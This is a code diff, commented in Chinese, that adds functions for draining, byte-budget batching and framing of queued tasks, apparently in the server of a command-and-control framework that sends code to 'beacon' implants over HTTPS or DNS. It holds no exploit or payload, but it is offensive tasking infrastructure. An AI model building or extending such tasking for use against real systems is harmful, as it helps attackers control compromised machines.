@@ -104,3 +104,69 @@ def build_auto_tasks(commands, client_id, dispatcher) -> list:
             continue
         tasks.append(task)
     return tasks
+
+
+def drain_tasks(client_id: str, tq) -> list:
+    """弹出某 beacon 的全部待执行任务（FIFO 顺序）。批量模型:一次下发全部。"""
+    tasks = []
+    while True:
+        task = tq.pop(client_id)
+        if task is None:
+            return tasks
+        tasks.append(task)
+
+
+def take_task_batch(client_id: str, tq, budget: int) -> list:
+    """按字节预算弹出一批任务（超预算的任务放回队头,下次再取）。
+
+    无状态通道(HTTPS/DNS)每次响应只能回一帧,用它分批领取;
+    预算近似 = task_id + code 长度 + 帧开销余量。
+    """
+    tasks, size = [], 0
+    while True:
+        t = tq.pop(client_id)
+        if t is None:
+            return tasks
+        approx = len(getattr(t, "task_id", "")) + len(getattr(t, "code", "")) + 64
+        if tasks and size + approx > budget:
+            tq.push_front(client_id, t)
+            return tasks
+        tasks.append(t)
+        size += approx
+
+
+def pack_tasks_batch(tasks, budget: int) -> list:
+    """按字节预算把任务列表拆成多批（每批 = 原 Task 对象列表）。
+
+    预算近似 = task_id + code 长度 + 帧开销余量;超预算拆批,防单帧超限。
+    返回批次列表,每批仍是 Task 对象(重发时可直接 push_front 原对象)。
+    """
+    batches, cur, size = [], [], 0
+    for t in tasks:
+        approx = len(getattr(t, "task_id", "")) + len(getattr(t, "code", "")) + 64
+        if cur and size + approx > budget:
+            batches.append(cur)
+            cur, size = [], 0
+        cur.append(t)
+        size += approx
+    if cur:
+        batches.append(cur)
+    return batches
+
+
+def batch_response(acked: list, tasks: list, budget: int) -> list:
+    """构造批量下发帧载荷列表: [{tasks: [...], acked: [...]}, ...]（按预算分批）。
+
+    acked 只携带在首批(implant 端收到任意帧的 acked 即清理本地结果)。
+    """
+    frames = []
+    if not tasks:
+        return [{"tasks": [], "acked": list(acked)}]
+    first = True
+    for batch in pack_tasks_batch(tasks, budget):
+        frames.append({
+            "tasks": [{"task_id": t.task_id, "code": t.code} for t in batch],
+            "acked": list(acked) if first else [],
+        })
+        first = False
+    return frames
